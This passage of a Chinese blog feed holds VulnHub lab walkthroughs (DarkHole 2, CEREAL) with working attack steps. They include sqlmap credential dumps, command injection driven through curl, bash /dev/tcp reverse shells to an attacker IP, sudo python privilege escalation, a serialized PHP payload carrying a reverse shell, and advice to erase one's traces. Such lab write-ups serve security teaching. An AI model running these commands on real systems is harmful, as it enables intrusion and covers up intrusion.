alt=\"Image\">\n<p>通过.git 文件可以得到此项目的源码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1203.png\" width=\"460\" alt=\"Image\">\n<p>源码中有 config 是敏感文件，进行读取</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1204.png\" width=\"480\" alt=\"Image\">\n<p>得到了数据的账户密码  <code>root:darkhole_2</code></p>\n<p>但是通过 githack 的方式读取到的源码没有记录之前的 git 版本，没法使用 git 命令去获取到之前提交的版本</p>\n<h3 id=\"git-log切换git分支\"><a class=\"markdownIt-Anchor\" href=\"#git-log切换git分支\">#</a> git log 切换 git 分支</h3>\n<p>除了 githack 的利用方式之外还可以用如下方式</p>\n<p><code>TF=$(mktemp -d); cd $TF;wget -r http://192.168.31.12/.git/ -q; cd $TF/192.168.31.12 &amp;&amp; git clone. webapp &amp;&amp; cd webapp</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1205.png\" width=\"660\" alt=\"Image\">\n<p>通过这种方式可以得到.git 文件，执行 git 的相关命令</p>\n<p><code>git log</code>  查看之前提交的版本，看到有一次提交信息是涉及到 login.php 的，切换到该分支查看<br>\n <code>git reset --hard a4d900a8d85e8938d3601f3cef113ee293028e10</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1206.png\" width=\"580\" alt=\"Image\">\n<p>在 login.php 内容中看到了用户名和密码 <code>lush@admin.com:321</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1207.png\" width=\"500\" alt=\"Image\">\n<h3 id=\"sqlmap一把梭\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap一把梭\">#</a> sqlmap 一把梭</h3>\n<p>通过得到的用户名和密码进入到了对方后台管理中心</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1208.png\" width=\"620\" alt=\"Image\">\n<p>观察 url 地址 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTQvZGFzaGJvYXJkLnBocD9pZD0x\">http://192.168.31.94/dashboard.php?id=1</span></p>\n<p>似乎是存在 sql 注入的，通过 burp 截取数据包</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1209.png\" width=\"620\" alt=\"Image\">\n<p><code>sqlmap -r 1.txt --dbs --batch</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1210.png\" width=\"520\" alt=\"Image\">\n<p>跑出来了数据库的名字 darkhole_2，继续测试数据库中有哪些表<br>\n <code>sqlmap -r 1.txt --dbs --batch - D darkhole_2 --tables</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1211.png\" width=\"480\" alt=\"Image\">\n<p>得到两张表，选取 ssh 表去查看有哪些列<br>\n <code>sqlmap -r 1.txt --dbs --batch - D darkhole_2 -T ssh --columns</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1212.png\" width=\"480\" alt=\"Image\">\n<p>得到此表下的三个字段 user、id、pass<br>\n <code>sqlmap -r 1.txt --batch -D darkhole_2 -T ssh -C user,id,pass --dump</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1213.png\" width=\"480\" alt=\"Image\">\n<p>最终得到了数据库的用户名和密码 <code>jehad:fool</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1214.png\" width=\"700\" alt=\"Image\">\n<p>凭借凭据 jehad 拿到了靶机上一个普通用户的权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1215.png\" width=\"520\" alt=\"Image\">\n<p>查看靶机上有没有开放特殊的端口</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1216.png\" width=\"480\" alt=\"Image\">\n<h3 id=\"curl-测试网站\"><a class=\"markdownIt-Anchor\" href=\"#curl-测试网站\">#</a> curl 测试网站</h3>\n<blockquote>\n<p>发现在这台服务器上有 9999 端口正在运行，但是此端口被防火墙关掉了，我们在 kali 机器上无法访问此端口，可以做 ssh 端口转发将此端口映射到外面，当然也可以通过 curl 命令在这台 linux 机器上直接访问此网站</p>\n</blockquote>\n<p><code>curl -vv 127.0.0.1:9999</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1217.png\" width=\"350\" alt=\"Image\">\n<p>可以看到所提交的数据包以及返回的数据包，并且可以看到页面是采用的 php 写的，返回了一个 cmd 的参数，很有可能是命令执行漏洞；执行系统命令，看当前这个网站是属于哪个用户下的</p>\n<blockquote>\n<p><code>curl 127.0.0.1:9999?cmd=id;echo ''</code> <br>\n <code>echo ''</code>  的作用使回显比较美观一些，没有实际的作用<br>\n得到了此网站是由用户 losy 的权限搞的，现在需要把 losy 用户的 shell 反弹<br>\n判断 losy 是否可以使用 nc 命令反弹 shell<br>\n <code>curl 127.0.0.1:9999?cmd=which%20nc;echo ''</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1218.png\" width=\"460\" alt=\"Image\">\n<p>使用 nc 反弹 shell，并在 kali 上进行监听<br>\n <code>curl 127.0.0.1:9999?cmd=nc%20192.168.31.99%204444%20-e%20/bin/bash;echo ''</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1219.png\" width=\"590\" alt=\"Image\">\n<p>反弹失败了，有可能是因为被禁用了 nc、也有可能是未采用 base 64 编码，需要都进行尝试一番，使用 bash 反弹 shell 时的命令执行成功了</p>\n<p><code>curl 127.0.0.1:9999/?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.99%2F4444%200%3E%261%27</code> <br>\n 采用的命令即是： <code>bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.31. 99 /4444 0&gt;&amp;1'</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1220.png\" width=\"700\" alt=\"Image\">\n<h3 id=\"调整为标准终端\"><a class=\"markdownIt-Anchor\" href=\"#调整为标准终端\">#</a> 调整为标准终端</h3>\n<p>调整为一个标准的 tty 终端</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class=\"line\">python3 -c &quot;__import__(&#x27;pty&#x27;).spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class=\"line\">stty -a</span><br><span class=\"line\">stty raw -echo;fg</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1221.png\" width=\"540\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">调整TERM、<span class=\"built_in\">stty</span>的窗口大小</span></span><br><span class=\"line\">export TERM=xterm</span><br><span class=\"line\">stty rows 31 columns 118</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1222.png\" width=\"320\" alt=\"Image\">\n<p>此刻的我们已经拿到了 losy 用户的 shell</p>\n<h3 id=\"历史遗留信息\"><a class=\"markdownIt-Anchor\" href=\"#历史遗留信息\">#</a> 历史遗留信息</h3>\n<p>在 kali 上给靶机传输一个 pspy 看看有没有敏感任务被执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1223.png\" width=\"700\" alt=\"Image\">\n<p>看到在 /opt/web 下有一个 php 启动本地 9999 端口的命令</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1224.png\" width=\"660\" alt=\"Image\">\n<p>由此造成了 9999 端口处的命令执行漏洞</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1225.png\" width=\"290\" alt=\"Image\">\n<p>到处查看文件，找到了在 bash_history 里边的敏感记录，当中有一个密码，发现这个密码不是 root 用户的，只是 losy 用户的，这个密码也可以爆破得到</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1226.png\" width=\"340\" alt=\"Image\">\n<p>通过 <code>sudo -l</code>  查到了一条隐私设置错误的记录<br>\n `sudo -u root python3 -c “<strong>import</strong>(‘os’).system(’/bin/bash’)”``</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1227.png\" width=\"620\" alt=\"Image\">\n<p>-&gt; 提权成功拿到了 root 权限</p>\n<h3 id=\"ssh-显示系统信息\"><a class=\"markdownIt-Anchor\" href=\"#ssh-显示系统信息\">#</a> ssh 显示系统信息</h3>\n<p>对于 ssh 登陆之后有大量的系统信息展示出来，这在我们看来是完全没有必要的，而且占用了大量的屏幕不太友好，接下来就自定义 ssh 登陆后的信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1228.png\" width=\"480\" alt=\"Image\">\n<p>这是默认显示的信息，分了两部分，上面的是打印的系统信息，下面的是最后登陆到此服务器的时间和 ip</p>\n<p>上边的信息来自来自 /run/motd.dynamic 文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1229.png\" width=\"480\" alt=\"Image\">\n<p>这个文件的信息无法修改，哪怕被清空了也会复原。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1230.png\" width=\"480\" alt=\"Image\">\n<blockquote>\n<p>它是由 /etc/update-motd.d/ 下的几个脚本文件来动态生成的。将 /etc/update-motd.d/ 下的脚本移除或者去掉可执行权限可将此动态生成的系统信息去掉。<br>\n <code>chmod -x /etc/update-motd.d/*;echo &gt; /run/motd.dynamic;</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1231.png\" width=\"600\" alt=\"Image\">\n<blockquote>\n<p>反之，赋予这个文件夹所有文件可执行权限之后，可以显示出系统信息开启 linux 系统信息展示： <code>chmod +x /etc/update-motd.d/*</code></p>\n</blockquote>\n<h3 id=\"ssh-最后登录ip\"><a class=\"markdownIt-Anchor\" href=\"#ssh-最后登录ip\">#</a> ssh 最后登录 ip</h3>\n<blockquote>\n<p>下面的这条显示最后登陆信息是由 ssh 控制，ssh 默认是开启此记录的，可修改 ssh 的配置文件，令其消失不见，关闭最后登陆的日志命令如下：<br>\n <code>sed -i 's/#PrintLastLog yes/PrintLastLog no/g' /etc/ssh/sshd_config;systemctl restart sshd</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1232.png\" width=\"560\" alt=\"Image\">\n<p>最后登陆的消息一般来说比较重要，可以方便的看到自己的机器是否有异地登陆的情况出现，开启最后登陆的日志命令如下：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1233.png\" width=\"560\" alt=\"Image\">\n<h3 id=\"ssh-登录时logo\"><a class=\"markdownIt-Anchor\" href=\"#ssh-登录时logo\">#</a> ssh 登录时 logo</h3>\n<blockquote>\n<p>很多时候我们需要自定义一些登陆后的 logo 展示，可以选在登陆前或者登陆后显示一些 logo，而 /etc/motd 的作用就是用来登陆之后会显示的内容，可在 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYm9vdHNjaG9vbC5uZXQvYXNjaWklRTQlQjglOEElRTglQkYlOUIlRTglQTElOEMlRTUlQUQlOTclRTYlQUYlOEQlRTclOUElODQlRTUlOUIlQkUlRTUlQkQlQTIlRTclQkMlOTYlRTclQTAlODE=\">https://www.bootschool.net/ascii 上进行字母的图形编码</span><br>\n开启 linux 登陆 logo 提示：<br>\n <code>echo -e '\\n\\n\\t\\t██╗ ██╗ ████████╗\\n\\t\\t╚██╗██╔╝ ╚══██╔══╝\\n\\t\\t ╚███╔╝ ██║ \\n\\t\\t ██╔██ ╗ ██║ \\n\\t\\t██╔╝ ██╗███████╗██║ \\n\\t\\t ╚═╝ ╚═╝╚══════╝╚═╝\\n' &gt; /etc/motd</code> <br>\n-e 表示开启转义 \\n 表示换行 \\t 表示 tab 按键</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1234.png\" width=\"520\" alt=\"Image\">\n<blockquote>\n<p>关闭这个 logo 提示，只需要将 /etc/motd 清空就可以<br>\n <code>echo &gt; /etc/motd;vim /etc/motd +&quot;d 1 &quot; +wq</code>  会有一个空格<br>\n <code>cat /dev/null &gt; /etc/motd</code>  没有任何东西，直接清空文件</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1235.png\" width=\"380\" alt=\"Image\">\n<blockquote>\n<p>上述命令是用来展示或者不展示在 linux 登陆之后的 logo，还有一种方式是用来添加在 linux 登陆之前就来展示的 logo，使用 /etc/issue.net 来控制<br>\n <code>sed -i 's/#Banner none/Banner \\/etc\\/issue.net/g' /etc/ssh/sshd_config;systemctl restart sshd; echo -e '\\n\\t\\t███████╗██╗ ██╗██╗ ██╗\\n\\t\\t╚══███╔╝╚██╗ ██╔╝██║ ██║\\n\\t\\t ███╔╝ ╚████╔╝ ███████║\\n\\t\\t ███╔╝ ╚██╔╝ ██╔══██║\\n\\t\\t███████╗ ██║ ██║ ██║\\n\\t\\t╚══════╝ ╚═╝ ╚═╝ ╚═╝' &gt; /etc/issue.net</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1236.png\" width=\"560\" alt=\"Image\">\n<blockquote>\n<p>可以看到这条 logo 信息是在我们输入 root 密码之前就显示出来的，是在登陆前显示的，/etc/issue.net 的作用就是登陆前显示信息<br>\n将登陆后的信息也显示一下进行对比就更容易理解执行前面的命令，给 /etc/motd 重新打印出来了 X_T 的样式</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1237.png\" width=\"550\" alt=\"Image\">\n<blockquote>\n<p>/etc/issue.net 显示在登陆前，/etc/motd 显示在登陆后<br>\n一键关闭登陆前的信息展示<br>\n <code>sed -i 's/Banner \\/etc\\/issue.net/#Banner none/g' /etc/ssh/sshd_config;systemctl restart sshd;echo &gt; /etc/issue.net</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1238.png\" width=\"580\" alt=\"Image\">\n<h3 id=\"ssh-自定义登录文字\"><a class=\"markdownIt-Anchor\" href=\"#ssh-自定义登录文字\">#</a> ssh 自定义登录文字</h3>\n<blockquote>\n<p>除了上述几种方式外，我们还可以添加自定义的语句到环境变量中，登陆到 shell 后就会执行</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在环境变量里边添加figlet表示以一种方式去打印后面跟的字母或者数字</span></span><br><span class=\"line\">cat &gt;&gt; ~/.bashrc &lt;&lt; EOF</span><br><span class=\"line\">figlet I\\&#x27;m X_T</span><br><span class=\"line\">EOF</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">检查这个文件是否完整的写入到了环境变量里边</span></span><br><span class=\"line\">cat ~/.bashrc | tail -n1</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1239.png\" width=\"380\" alt=\"Image\">\n<p>vim ~/.bashrcs 删除此条信息则不会在显示这条</p>\n<h3 id=\"一键删除登录信息\"><a class=\"markdownIt-Anchor\" href=\"#一键删除登录信息\">#</a> 一键删除登录信息</h3>\n<blockquote>\n<p>如果显示的信息太多了，影响视觉，有没有办法一键全部删除掉，答案是肯定的，在每个用户下执行创建.hushlogin 文件，则所有非环境变量里边的信息都再不会被显示出来<br>\n for USER in `cat /etc/passwd | grep /bin/bash |grep -v root | cut -d “:” -f 1` ;do touch /home/$USER/.hushlogin;done;touch /root/.hushlogin</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1240.png\" width=\"520\" alt=\"Image\">\n<blockquote>\n<p>一键删除阻碍登陆日志信息输出的文件：<br>\nfor USER in `cat /etc/passwd | grep /bin/bash |grep -v root | cut -d “:” -f 1` ;do rm -f /home/$USER/.hushlogin;done;rm -f /root/.hushlogin</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1241.png\" width=\"520\" alt=\"Image\">\n<p>根据以上的信息就可以自定义 ssh 登陆的信息自定义的设置，当然最后记得复原，并且删除自己操作过的痕迹，防止被知道自己操作过什么。</p>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/144%20CEREAL/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/144%20CEREAL/",
            "title": "VULNHUB 44 CEREAL",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2VyZWFsLTEsNzAzLw==\">https://www.vulnhub.com/entry/cereal-1,703/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU3Nzk0MTQuaHRtbA==\">https://www.cnblogs.com/sainet/p/15779414.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 CEREAL：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1305.png\" width=\"520\" alt=\"Image\">\n<p>2 ）粗略的识别一下该 ip 上开放了哪些端口<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs sudo nmap -PA</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1306.png\" width=\"660\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31. 83<br>\n 靶机开放端口 21 , 22 , 80 , 139 , 445 , 3306 , 11111 , 55555</p>\n<p>3 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1307.png\" width=\"500\" alt=\"Image\">\n<blockquote>\n<p>检索到的有效服务如下所示<br>\n 21 ftp：可尝试进行匿名登陆下载文件<br>\n 22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用<br>\n 80 、44441 http：可对 web 进行渗透测试收集信息<br>\n 3306 mysql：可进行自制字典爆破或社工收集账户密码<br>\n 139 端口，是 NetBIOS 会话服务端口，主要用于提供 Windows 文件和打印机共享以及 UNIX 中的 Samba 服务。可进行 smb 利用。<br>\n445 端口，通过它可以在局域网中轻松访问各种共享文件夹或共享打印机，能通过该端口共享硬盘。</p>\n</blockquote>\n<blockquote>\n<p>注意到有很多服务名字是 tcpwrapped：<br>\n这说明 tcp 三次握手已经完成，但是并没有和目标主机建立连接。这表明，虽然目标主机的某项服务是可提供的，但你不在允许访问主机的名单列表中。当大量的端口服务都为 tcpwrapped 时，这说明可能是有负载均衡或者防火墙阻断了你的连接请求。</p>\n</blockquote>\n<h3 id=\"ftp-匿名访问\"><a class=\"markdownIt-Anchor\" href=\"#ftp-匿名访问\">#</a> FTP 匿名访问</h3>\n<p>打开 <span class=\"exturl\" data-url=\"ZnRwOi8vMTkyLjE2OC4zMS44Mw==\">ftp://192.168.31.83</span> 进行 ftp 信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1308.png\" width=\"420\" alt=\"Image\">\n<p>有一个空文件夹 pub、没有更多的详细信息暴露出来</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODMv\">http://192.168.31.83/</span> 进行 web 信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1309.png\" width=\"530\" alt=\"Image\">\n<blockquote>\n<p>对页面到处点了点之后，没有看到可以直接利用的点。包括查看 robots 文件、查看网页源代码，查看是否有 git 文件泄漏，查看网站的框架、CMS 是否有可以直接利用的漏洞，查看页面中是否有敏感信息暴露出来如可疑的域名。</p>\n</blockquote>\n<p>接下来就对网站进行目录扫描，扫描是否存在敏感的目录，指定后缀与字典开扫，我喜欢用的字典是 directory-list-2.3-medium.txt 比较全。<br>\n <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.31.83/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1310.png\" width=\"660\" alt=\"Image\">\n<p>依次对识别到的目录进行访问：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODMvYmxvZy8=\">http://192.168.31.83/blog/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1311.png\" width=\"520\" alt=\"Image\">\n<p>找到了两条信息，域名 <span class=\"exturl\" data-url=\"aHR0cDovL2NlcmVhbC5jdGY=\">http://cereal.ctf</span> , 另一个看网站的形式像是 wordpress.</p>\n<p>修改本地 hosts 文件，将域名的 DNS 解析指向靶机 ip 地址。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1312.png\" width=\"470\" alt=\"Image\">\n<p>再次打开网站，看一下页面有啥变化</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1313.png\" width=\"570\" alt=\"Image\">\n<h3 id=\"wpscan-枚举\"><a class=\"markdownIt-Anchor\" href=\"#wpscan-枚举\">#</a> wpscan 枚举</h3>\n<p>用 wpscan 进行一波扫描，枚举用户名<br>\n <code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://cereal.ctf/blog/ --enumerate u</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1314.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 得到两个用户名分别为 cereal 和 Cereal</p>\n<p>一般只能收集到用户名、密码能收集到的情况比较少、我们就搜集一下试试</p>\n<p><code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc -U 'cereal,Cereal' -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://cereal.ctf/blog/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1315.png\" width=\"700\" alt=\"Image\">\n<p>果然密码搜集不出来，但是知道了域名的话就可以尝试目标网站是否存在子域名</p>\n<p>尝试搜索子域名后无果，继续访问我们收集到的其他 web</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODMvYWRtaW4v\">http://192.168.31.83/admin/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1316.png\" width=\"550\" alt=\"Image\">\n<p>一个后台的登陆地址，可以尝试弱口令，万能密码，sql 注入、burp 代理数据修改返回包、爆破密码、xss 攻击等。简单的试了试之后发现并没有什么很严重的弱点，就把现在的目标转到其他的网站上。</p>\n<h3 id=\"子域名收集\"><a class=\"markdownIt-Anchor\" href=\"#子域名收集\">#</a> 子域名收集</h3>\n<p>收集另一个开放的 web 站点的信息：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODM6NDQ0NDE=\">http://192.168.31.83:44441</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1317.png\" width=\"500\" alt=\"Image\">\n<p>收集这个站点的目录并没有什么有价值的信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1318.png\" width=\"620\" alt=\"Image\">\n<p>收集 44441 端口上是否存在一些子域名<br>\n <code>gobuster vhost -u http://cereal.ctf:44441 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1319.png\" width=\"620\" alt=\"Image\">\n<p>收集到了子域名 secure.cereal.ctf:44441</p>\n<p>修改本地 hosts 文件，改变 DNS 解析指向为靶机 ip 地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1320.png\" width=\"520\" alt=\"Image\">\n<p>经过上述的信息收集，我们能得到的可以利用的漏洞很有可能就是在后来发现的这个子域名上。</p>\n<h3 id=\"继续信息收集\"><a class=\"markdownIt-Anchor\" href=\"#继续信息收集\">#</a> 继续信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovL3NlY3VyZS5jZXJlYWwuY3RmOjQ0NDQx\">http://secure.cereal.ctf:44441</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1321.png\" width=\"520\" alt=\"Image\">\n<p>发现了命令执行，但是输入；&amp;| 都没有起作用后，截取数据包，看数据包中的内容是些什么</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1322.png\" width=\"700\" alt=\"Image\">\n<p>可以选在 burp 自带的 url 解码，也可以在线 url 解码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1323.png\" width=\"640\" alt=\"Image\">\n<p>如图依次点击可将原先的编码进行 url 解码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1324.png\" width=\"590\" alt=\"Image\">\n<p>这是一个 php 反序列化漏洞，但是如果找不到源码的话很难去利用这个漏洞，寻找这个子域名下是否有一些目录存在</p>\n<p><code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://secure.cereal.ctf:44441/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1325.png\" width=\"660\" alt=\"Image\">\n<p>扫的比较慢，而且大半天也没有什么发现</p>\n<h3 id=\"ffuf模糊测试\"><a class=\"markdownIt-Anchor\" href=\"#ffuf模糊测试\">#</a> ffuf 模糊测试</h3>\n<p>换个字典换个工具跑  <code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://secure.cereal.ctf:44441/FUZZ</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1326.png\" width=\"660\" alt=\"Image\">\n<p>找到了一个 back_en 的备份文件夹</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1327.png\" width=\"660\" alt=\"Image\">\n<p>打开之后发现是没有权限去进入这个目录</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1328.png\" width=\"580\" alt=\"Image\">\n<p>但是这个目录是确实存在的，继续向下扫描看能否找到敏感文件<br>\n <code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://secure.cereal.ctf:44441/back_en/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1329.png\" width=\"660\" alt=\"Image\">\n<p>找到一个备份文件 index.php.bak, 打开之后发现了源码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1330.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"php反序列化\"><a class=\"markdownIt-Anchor\" href=\"#php反序列化\">#</a> php 反序列化</h3>\n<p>看源代码可以规范代码的格式，阅读此处的 php 代码查看反序列化造成的原因<br>\n <code>view-source:http://secure.cereal.ctf:44441/back_en/index.php.bak</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1331.png\" width=\"520\" alt=\"Image\">\n<blockquote>\n<p>isValid 默认为 False，从浏览器发送请求时，会进入 if，并检查该值是否为 IP 地址。<br>\n尝试注入命令时，它拒绝了输入，如果我们在请求中发送值 True，则根本不会执行 if 块。<br>\n会直接调用 ping 方法。通过 shell_exec 函数执行命令。</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">需要先实例化、在进行序列化和url编码：</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">class pingTest &#123;</span><br><span class=\"line\">  public $ipAddress = &quot;;bash -i &gt;&amp; /dev/tcp/192.168.31.18/4444 0&gt;&amp;1 &quot;;</span><br><span class=\"line\">  public $isValid = True;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">obj = NEW pingTest;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">serilaze= serialize(<span class=\"variable\">$obj</span>);</span></span><br><span class=\"line\">echo urlencode($serilaze);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>可以在线 php 执行，输出内容如下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1332.png\" width=\"520\" alt=\"Image\">\n<p>也可以用 php 去执行下面的代码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1333.png\" width=\"660\" alt=\"Image\">\n<p>得到漏洞利用代码：<br>\n <code>O%3A8%3A%22pingTest%22%3A2%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A45%3A%22%3Bbash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.31.15%2F4444+0%3E%261+%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1%3B%7D</code></p>\n<p>将 payload 发送到 burp 中，用 burp 发送此恶意数据</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1334.png\" width=\"620\" alt=\"Image\">\n<p>同时在 kali 上监听端口，得到了反弹的 shell，并进行终端优化</p>\n<img 